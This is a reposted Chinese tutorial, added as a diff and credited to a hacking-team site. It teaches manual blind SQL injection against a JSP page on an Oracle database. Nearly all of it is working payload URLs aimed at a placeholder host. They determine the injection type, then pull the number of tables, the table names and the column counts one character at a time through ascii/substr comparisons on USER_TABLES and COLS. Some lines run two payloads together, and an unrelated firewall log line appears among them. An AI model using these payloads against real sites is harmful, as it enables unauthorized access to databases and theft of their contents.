@@ -1,0 +1,361 @@
+[转载]手工注射JSP学习
+信息来源：邪恶八进制信息安全团队（www.eviloctal.com）
+
+1、 判断注入类型（数字型还是字符型）  
+字符型和数字型数据判断：（希望有人能进一步的细化，细分为数字型和字符型判断两部分）  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And user>char(0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And userhttp://www.test.net/index_kaoyan_view.jsp?id=117’ And user>char(0) And ’1’=’1  
+http://www.test.net/index_kaoyan_view.jsp?id=117’ And userhttp://www.test.net/index_kaoyan_view.jsp?id=117’ And user>char(0) And ’%25’=’  
+http://www.test.net/index_kaoyan_view.jsp?id=117’ And userhttp://www.test.net/index_kaoyan_view.jsp?id=117) And user>char(0) And 1 in(1  
+http://www.test.net/index_kaoyan_view.jsp?id=117) And userhttp://www.test.net/index_kaoyan_view.jsp?id=117’) And user>char(0) And (’ ’)=(’  
+http://www.test.net/index_kaoyan_view.jsp?id=117’) And user 
+http://www.test.net/index_kaoyan_view.jsp?id=117 And str(98)>str(97)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And str(98)http://www.test.net/index_kaoyan_view.jsp?id=117’ And str(98)>str(97) And ’1’=’1  
+http://www.test.net/index_kaoyan_view.jsp?id=117’ And str(98) 
+http://www.test.net/index_kaoyan_view.jsp?id=117’ And str(98)>str(97) And ’%25’=’  
+
+　  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117’ And userhttp://www.test.net/index_kaoyan_view.jsp?id=117’ And str(98) 
+http://www.test.net/index_kaoyan_view.jsp?id=117) And str(98)>str(97) And 1 in(1  
+http://www.test.net/index_kaoyan_view.jsp?id=117) And str(98)http://www.test.net/index_kaoyan_view.jsp?id=117’) And str(98)>str(97) And (’ ’)=(’  
+http://www.test.net/index_kaoyan_view.jsp?id=117’) And str(98) 
+出现正常的页面：  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And USER>CHR(0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And USER 
+2、 猜解表数量和表名  
+
+数据库数量为3：  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 0<=nvl(length((SELECT COUNT (*) FROM USER_TABLES)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 1>=nvl(length((SELECT COUNT (*) FROM USER_TABLES)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2<=nvl(length((SELECT COUNT (*) FROM USER_TABLES)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 4>=nvl(length((SELECT COUNT (*) FROM USER_TABLES)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 3=nvl(length((SELECT COUNT (*) FROM USER_TABLES)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And UNISTR(1)>UNISTR(0)  
+
+以下为猜解数据表数量  
+数据表第一位为：1  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 52=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 52>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),1,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 49=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),1,1))  
+
+
+数据表第二位为：3  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 49=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 109=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 109>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 102=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 102>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 99=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 99>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 97=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 97>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 53=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 53>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 51=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),2,1))  
+
+数据表第三位为：1  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 51=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 109=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 109>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 102=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 102>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 102>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 99=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 99>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 97=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 97>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 54=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 54>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 52=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 52>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 52>ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 49=ascii(substr((SELECT COUNT (*) FROM USER_TABLES),3,1))  
+
+共有131个数据表，见上图。  
+
+以下为猜解表名称：  
+以下为判断第一个表的长度为：2  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 0<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 0<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 1>=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 4>=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 3=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 3>nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+
+以下为判断第一个表的第一位值为：A  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),1,1))  
+
+以下为判断第一个表AD的第二位值为：D  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 78=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 78>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 71=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 71>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 68=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=1)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+
+以下为判断第二个表的表ADER的表名长度为：4  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 0<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 1>=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 4>=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 3=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 3>nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 4=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+以下为判断第二个表ADER第一位的值为：A  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),1,1))  
+
+以下为判断第二个表ADER第二位的值为：D  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 78=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 78>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 71=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 71>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 68=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),2,1))  
+
+以下为判断第二个表ADER第三位的值为：E  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 68=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 79=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 79>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 73=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 73>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 73>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 69=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),3,1))  
+
+以下为判断第二个表ADER第四位的值为：R  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 69=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 80=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 80>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 80>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 85=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 85>ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 82=ascii(substr((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=2)ORDER BY 1DESC)WHERE ROWNUM<=1),4,1))  
+
+以下为判断第三个表的表名长度为：  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 0<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=3)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 1>=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=3)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2<=nvl(length((SELECT TABLE_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM USER_TABLES ORDER BY 1ASC)WHERE ROWNUM<=3)ORDER BY 1DESC)WHERE ROWNUM<=1)),0)  
+
+3、 猜解列名长度和列名：  
+a) 以下为猜解字段长度为：2位  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 0<=nvl(length((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68))),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 1>=nvl(length((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68))),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2<=nvl(length((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68))),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 4>=nvl(length((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68))),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 3=nvl(length((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68))),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 3>nvl(length((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68))),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2=nvl(length((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68))),0)  
+
+
+l 列名长度为：10位以上  
+以下猜解列名的长度的第一位为：1（十位）  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 52=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 52>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 49=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),1,1))  
+
+以下猜解列名长度的第二位为：0（个位）  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 49=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+Informational 10/12/2005 15:03:25 Suspect event: ICMP Time Exceeded (> 1 for 1 seconds)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 109=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 109>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
